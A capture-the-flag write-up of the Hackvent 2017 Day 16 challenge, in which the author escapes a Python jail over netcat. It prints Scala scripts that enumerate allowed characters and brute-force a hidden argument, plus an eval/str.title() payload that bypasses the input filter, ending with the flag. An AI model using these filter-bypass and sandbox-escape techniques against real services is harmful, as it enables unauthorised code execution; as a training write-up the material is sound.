# Day 16: Try to escape ...

*... from the snake cage*

Santa programmed a secure jail to give his elves access from remote. Sadly the jail is not as secure as expected.

`nc challenges.hackvent.hacking-lab.com 1034`

### Solution

When you connect to the server you see a nice python ascii-art and a hint: *The flag is stored super secure in the function SANTA!*

My first naive attempt was to simply type `SANTA()` in the command prompt.

```
$ nc challenges.hackvent.hacking-lab.com 1034
                  _____
              .-'`     '.
           __/  __       \\
          /  \ /  \       |    ___
         | /`\| /`\|      | .-'  /^\/^\\
         | \(/| \(/|      |/     |) |)|
        .-\__/ \__/       |      \_/\_/__..._
_...---'-.                /   _              '.
 /,      ,             \   '|  `\                \\
| ))     ))           /`|   \    `.       /)  /) |
| `      `          .'       |     `-._         /
\                 .'         |     ,_  `--....-'
 `.           __.' ,         |     / /`'''`
 `'-.____.-' /  /,         |    / /
     `. `-.-` .'  \        /   / |
       `-.__.'|    \      |   |  |-.
          _.._|     |     /   |  |  `'.
    .-''``    |     |     |   /  |     `-.
 .'`         /      /     /  |   |        '.
 /`           /      /     |   /   |\         \\
/            |      |      |   |   /\          |
 ||            |      /      |   /     '.        |
 |\            \      |      /   |       '.      /
 \ `.           '.    /      |    \        '---'/
\  '.           `-./        \    '.          /
 '.  `'.            `-._     '.__  '-._____.'--'''''--.
 '-.  `'--._          `.__     `';----`              \\
    `-.     `-.          `."'```                     ;
       `'-..,_ `-.         `'-.                     /
              '.  '.           '.                 .'

Challenge by pyth0n33. Have fun!

The flag is stored super secure in the function SANTA!
>>> a = SANTA()
name 'santa' is not defined
```

As you can see my input was lowercased for some reason. So I tried to get rid of it by using `eval` and `upper` but it didn't work at all.

```
>>> a = eval('SANTA()')
name 'santa' is not defined
>>> a = eval('santa()'.upper())
Denied
```

It was a surprise to get `Denied` response. It didn't make sense to me at this point. I experimented more with the input and then I realized that some characters are blocked and always cause denial. I wrote a simple script to find allowed characters for me.

```scala
val nc = NetCat.open("challenges.hackvent.hacking-lab.com", 1034)
try {
// read prompt
nc.read

// find allowed chars
val allowedChars = (' ' to '~').filter { c =>
nc.writeln(c.toString)
!nc.read.contains("Denied")
}
println(allowedChars.mkString(", "))
} finally {
nc.close
}
```

These are characters allowed in input:

```
", ', (, ), +, ., 0, 1, 2, 3, 7, 9, A, C, D, E, I, L, N, O, P, R, S, T, V, [, ], _, a, c, d, e, i, l, n, o, p, r, s, t, v
```

Now it finally makes sanse why `eval()` is allowed but `upper()` isn't - because of letter `u` which is not allowed in general. Now I got the idea what I'm dealing with.

After reading Python documentation I found a promising String method [`title()`](https://docs.python.org/3.6/library/stdtypes.html#str.title) which could work in combination with `eval()` and `print()`. Let's try it.

```
>>> a = print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'()'))
No flag for you!
```

OK, now it looks like we are getting somewhere! The `SANTA()` function is finally called but we need to find the right argument to pass in. I did some experiments with simple arguments and found interesting thing:

```
>>> a = print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'(1)'))
zip argument #2 must support iteration
>>> a = print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("1")'))
H
```

This indicates that `SANTA()` function calls `zip()` at some point and the argument should be a string. I wrote another script to try to find a string of allowed charatecters which results in the known flag prefix `HV17-`.

```scala
val nc = NetCat.open("challenges.hackvent.hacking-lab.com", 1034)
try {
val allowedChars = List('"', ''', '(', ')', '+', '.', '0', '1', '2', '3', '7', '9', 'A', 'C', 'D', 'E', 'I', 'L', 'N', 'O', 'P', 'R', 'S', 'T', 'V', '[', ']', '_', 'a', 'c', 'd', 'e', 'i', 'l', 'n', 'o', 'p', 'r', 's', 't', 'v')

// read prompt
nc.read
 
// try to find suitable argument for SANTA() function
val expected = "HV17-"
var arg = ""
for (len <- 1 to expected.length) {
  var found: Option[Char] = None
  for (c <- allowedChars) {
    if (found.isEmpty) {
      val msg = """print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("""" + (arg + c) + """")'))"""
      nc.writeln(msg)
      val res = nc.read
      if (res.startsWith(expected.substring(0, len))) {
        found = Some(c)
        println(s"'${arg + c}' -> '${res.split("\n")(0)}'")
      }
    }
  }
  arg += found.get
}
} finally {
nc.close
}
```

Here is the result:

```
'1' -> 'H'
'13' -> 'HV'
'133' -> 'HV1'
'1337' -> 'HV17'
'13371' -> 'HV17-'
```

It looks like masking with mask `1337`. The right argument should be repeated mask of total length of 29 characters. Let's verify this assumption with a complete program (source code can be found [here](../../src/main/scala/hackvent2017/Day16.scala)) which puts all the pieces together.

```scala
def main(args: Array[String]): Unit = {
  val nc = NetCat.open("challenges.hackvent.hacking-lab.com", 1034)
  try {
    // read prompt
    nc.read

    //val allowedChars = findAllowedChars(nc)
    //val argForFlagPrefix = findArgumentForExpectedResult(nc, allowedChars, "HV17-")

    val mask = (0 until 29).map(i => "1337".charAt(i % 4)).mkString
    println(callSanta(nc, mask))
  } finally {
    nc.close
  }
}

private def findAllowedChars(nc: NetCat): Seq[Char] = {
  (' ' to '~').filter { c =>
    nc.writeln(c.toString)
    !nc.read.contains("Denied")
  }
}

private def findArgumentForExpectedResult(nc: NetCat, allowedChars: Seq[Char], exptectedResult: String): String = {
  var arg = ""
  for (len <- 1 to exptectedResult.length) {
    var found: Option[Char] = None
    for (c <- allowedChars) {
      if (!found.isDefined) {
        val res = callSanta(nc, arg + c)
        if (res.startsWith(exptectedResult.substring(0, len))) {
          found = Some(c)
          println(s"'${arg + c}' -> '${res}'")
        }
      }
    }
    arg += found.get
  }
  arg
}

private def callSanta(nc: NetCat, arg: String): String = {
  val msg = """print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("""" + arg + """")'))"""
  nc.writeln(msg)
  nc.read.split("\n")(0)
}
```

The result is:

```
HV17-J41l-esc4-p3ed-w4zz-3asy
```